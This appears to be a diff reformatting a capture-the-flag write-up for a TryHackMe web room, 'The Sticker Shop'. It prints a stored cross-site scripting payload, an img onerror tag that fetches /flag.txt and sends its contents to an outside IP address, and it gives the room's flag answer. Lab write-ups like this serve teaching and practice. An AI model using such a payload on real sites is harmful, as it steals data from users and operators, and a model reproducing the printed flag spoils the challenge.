@@ -1,12 +1,29 @@
----
-created at: 2026-05-25
-difficulty: Easy
----
-## Room Description
+# The Sticker Shop
+
+| Field | Value |
+| --- | --- |
+| Platform | TryHackMe |
+| Category | Web Exploitation |
+| Difficulty | Easy |
+| Date | 2026-05-25 |
+
+## Overview
+
+Evaluate how customer feedback is handled by the shop's web application.
+
+<details>
+<summary>Original challenge description</summary>
+
 Your local sticker shop has finally developed its own webpage. They do not have too much experience regarding web development, so they decided to develop and host everything on the same computer that they use for browsing the internet and looking at customer feedback. Smart move!
 
 Can you read the flag at `http://MACHINE_IP:8080/flag.txt`?
-## Solution
+
+</details>
+
+## Analysis
+
+Stored cross-site scripting allowed untrusted content to execute in the feedback review context.
+
 ### 1. Reconnaissance & Enumeration
 We begin by scanning ports using **nmap**:
 ```bash
@@ -63,6 +80,8 @@ fetch('/flag.txt').then(res => res.text()).then(data => fetch(`http://192.168.14
 ```js
 <img src=x onerror="fetch('/flag.txt').then(res => res.text()).then(data => fetch(`http://192.168.141.232:9090/endpoint?flag=${data}`));"/>
 ```
-## Questions
+
+## Result
+
 **Question #1.** What is flag.txt flag?
 *Answer:* `THM{83789a69074f636f64a38879cfcabe8b62305ee6}`
